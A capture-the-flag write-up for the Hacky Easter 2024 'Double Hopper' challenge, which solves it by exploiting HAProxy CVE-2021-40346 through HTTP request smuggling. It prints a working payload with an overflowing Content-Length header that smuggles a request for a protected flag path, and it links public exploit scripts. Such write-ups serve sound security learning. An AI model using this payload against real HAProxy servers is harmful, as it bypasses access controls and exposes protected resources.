# Challenge "Double Hopper"
![Banner Image](banner.jpg)

Double hopper will not show you a double whopper.

[Double Hopper web site](http://ch.hackyeaster.com:2406/)

Note: The service is restarted every hour at x:00.

[config.txt](config.txt)

# Solution
The [config.txt](config.txt) file suggests a HAProxy web server configuration. Searching for path configuration vulnerabilities for that kind of server suggests the following possible exploit: https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/

By using this approach, we see the flag path: https://github.com/alexOarga/CVE-2021-40346/blob/main/payload

[payload](payload)

    POST /index HTTP/1.1
    Host: ch.hackyeaster.com:2406
    Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
    Content-Length: 23

    GET /flag HTTP/1.1
    h: GET /index HTTP/1.1
    Host: ch.hackyeaster.com:2406


Output in HTML:

    <img src="/static/flag-55a8408e060a25096eb95be8b86f3a2c66f91193.png"/>

With this script and some adjustments, we can then download the flag.png https://github.com/alikarimi999/CVE-2021-40346/blob/main/exploit.py:

[solver.py](solver.py)

![flag.png](flag.png)

## The flag
    he2024{Smu66l1m6_4ll_th3_t1m3!}
